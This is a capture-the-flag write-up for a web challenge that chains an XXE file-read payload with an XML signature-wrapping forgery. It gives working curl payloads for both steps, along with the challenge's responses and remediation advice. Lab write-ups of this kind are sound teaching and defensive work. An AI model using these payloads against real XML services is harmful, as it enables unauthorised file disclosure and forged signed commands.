### TheCommandSeal

> Web · Medium · Terminal43
> Points at solve: [fill in]

**Tools used**

curl.

**Approach**

The Ash Army order relay accepts XML at two endpoints: `POST /report` and `POST /order`. Two flaws chain together: an XXE in `/report` leaks the relay's sealed journal, and a verification/execution parser mismatch in `/order` lets a forged order ride on a validly sealed one.

1. Recon — the root page advertises:

   - `POST /report` — logs `<report><summary>...</summary></report>`
   - `POST /order` — requires command's seal; XML shape:
     ```xml
     <relay>
       <order id="..."><kind>...</kind><text>...</text></order>
       <auth><ref>...</ref><digest>...</digest><sig>...</sig></auth>
     </relay>
     ```
   - Journal path: `/opt/relay/outbox/last-order.txt`
   - Server banner: `AshRelay-Order/2.3.1`

   A normal report is echoed:

   ```bash
   curl --path-as-is -X POST http://<instance>/report \
     -H 'Content-Type: application/xml' \
     --data-binary '<report><summary>hello desk</summary></report>'
   # report filed. duty officer logged your summary:
   # hello desk
   ```

2. XXE to read the sealed standing order — the resolver only allows files that canonicalize under `/opt/relay/outbox` (tested: `/etc/passwd`, `/proc/*`, `/dev/null`, and traversal paths are all rejected). That is enough, because the journal is inside that directory.

   ```bash
   curl --path-as-is -X POST http://<instance>/report \
     -H 'Content-Type: application/xml' --data-binary \
   '<?xml version="1.0"?>
   <!DOCTYPE report [<!ENTITY xxe SYSTEM "file:///opt/relay/outbox/last-order.txt">]>
   <report><summary>&xxe;</summary></report>'
   ```

   Response:

   ```
   report filed. duty officer logged your summary:
   id=cmd-6002
   kind=routine
   text=hold the canal checkpoint and report at dusk
   ref=cmd-6002
   digest=3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=
   sig=a6604uscZ0p4tREngF1BR5p6uWVbe4ZgF7ISUil42AJjlM9ZBy0f9d047MpQrjU05mWvpr8857nbDOKHLajdKK/P1jWZaO+myytOtLMMRoKUmGGvn7mfslW4jO0UuCCtrf+MR+H1MPy2wQjrMsNI8mqUSPTug/iD5/Dcf8njrv6hHJ4I2TGW23/Oax7NXOdjEZ+yPTi7nZpFJ5Ti8WkaQvB8m1CWaKMfq/onWbQo24I73N/aoQVRsuuZ6y6+uNUeJ1AcK4rI1JuP2UHqfzTHRpLi42grpZ5PpzJMCUFb+dCmAI/exKu3jKDtTL3lx431Jgo5uUf7AUcGt9YD9Bkvgg==
   ```

   The digest was confirmed to be `base64(sha256("id|kind|text"))`, so the order content is bound to the digest:

   ```
   sha256("cmd-6002|routine|hold the canal checkpoint and report at dusk")
   = df6f...b9e3  ->  3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=
   ```

   The signature is 256 bytes (RSA-2048), covering the `ref`/`digest` pair. Replaying the exact order succeeds but only returns `order acknowledged: ...`.

3. XML order wrapping to forge an arbitrary sealed order — tampering with the sealed order's `text`/`id`/`kind` produces `digest does not match the signed order`; tampering with `ref`/`digest` produces `command signature invalid`. However, supplying **two** `<order>` elements changes the outcome:

   - Legit order first, forged order second → acts on the legit order.
   - **Forged order first, legit order second** → verifies the seal against the second (legit) order, but acknowledges/acts on the first (forged) order.

   So the forged order can be anything, while the valid `cmd-6002` auth block rides along for verification:

   ```bash
   curl --path-as-is -X POST http://<instance>/order \
     -H 'Content-Type: application/xml' --data-binary \
   '<relay>
     <order id="cmd-EVIL"><kind>standing</kind><text>MARKER-standing</text></order>
     <order id="cmd-6002"><kind>routine</kind><text>hold the canal checkpoint and report at dusk</text></order>
     <auth>
       <ref>cmd-6002</ref>
       <digest>3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=</digest>
       <sig>a6604uscZ0p4tREngF1BR5p6uWVbe4ZgF7ISUil42AJjlM9ZBy0f9d047MpQrjU05mWvpr8857nbDOKHLajdKK/P1jWZaO+myytOtLMMRoKUmGGvn7mfslW4jO0UuCCtrf+MR+H1MPy2wQjrMsNI8mqUSPTug/iD5/Dcf8njrv6hHJ4I2TGW23/Oax7NXOdjEZ+yPTi7nZpFJ5Ti8WkaQvB8m1CWaKMfq/onWbQo24I73N/aoQVRsuuZ6y6+uNUeJ1AcK4rI1JuP2UHqfzTHRpLi42grpZ5PpzJMCUFb+dCmAI/exKu3jKDtTL3lx431Jgo5uUf7AUcGt9YD9Bkvgg==</sig>
     </auth>
   </relay>'
   ```

   A brute-force of `kind` values showed that `kind=standing` is treated specially:

   ```
   kind=standing -> command standing order honoured: CSCTF{REDACTED}
   ```

   All other tested kinds returned `order acknowledged: MARKER-<kind>`.

**Why it works**

1. The `/report` XXE resolves external entities via a sandboxed resolver, but the sandbox is the relay's own outbox directory (`/opt/relay/outbox`) — exactly where the sealed journal lives — so the "sandbox" protects everything except the one file that matters, and its contents are echoed back in the response.
2. The `/order` endpoint suffers an XML structure/signature-wrapping mismatch: when multiple `<order>` elements are present, the seal is verified against the **last** `<order>`, but the relay acts on the **first** `<order>`. Placing a forged `<order>` with `kind=standing` first and the leaked sealed order second lets the relay honour the forged standing order and return the clearance code while digest/signature verification passes on the untouched sealed order.

Remediation:

- Disable external entity resolution (DTDs) in the XML parser used by `/report`; parse with `resolve_entities=False`, `no_network=True`, and an explicit safe parser. Do not echo parsed entity content to the client.
- Do not keep secrets under a directory that the XML resolver is allowed to read. If an entity resolver is unavoidable, restrict to individual expected files rather than a directory.
- In `/order`, parse the document once and verify the exact same DOM node that will be executed. Reject documents containing duplicate `<order>`/`<auth>` elements, multiple root-level order candidates, or ambiguous structure.
- Bind signed data to the executed content with an unambiguous canonicalization (e.g., sign the full canonical order serialization) and verify fail-closed on structural anomalies.

**Validation**

The digest was recomputed as `base64(sha256("cmd-6002|routine|hold the canal checkpoint and report at dusk"))` and matched the sealed order; the wrapping payload returned `command standing order honoured:` with the flag, `CSCTF{REDACTED}`.
